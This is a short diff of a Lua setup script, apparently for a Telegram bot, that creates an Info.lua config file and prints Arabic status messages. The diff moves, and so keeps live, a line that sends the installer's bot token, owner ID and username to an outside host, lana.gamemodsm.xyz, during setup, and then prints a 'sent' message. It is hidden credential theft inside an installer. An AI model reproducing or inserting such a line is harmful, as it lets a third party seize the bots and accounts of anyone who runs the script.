@@ -57,7 +57,6 @@ else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
 os.execute('lua sadam.lua')
-https.request("https://lana.gamemodsm.xyz/sadam/?id="..database:get(id_server..":SUDO:ID").."&user="..database:get(id_server..":SUDO:USERNAME").."&token="..database:get(id_server..":token"))
 end
 local create_config_auto = function()
 config = {
@@ -68,6 +67,7 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
 create(config, "./Info.lua")   
 end 
 create_config_auto()
+https.request("https://lana.gamemodsm.xyz/sadam/?id="..database:get(id_server..":SUDO:ID").."&user="..database:get(id_server..":SUDO:USERNAME").."&token="..database:get(id_server..":token"))
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
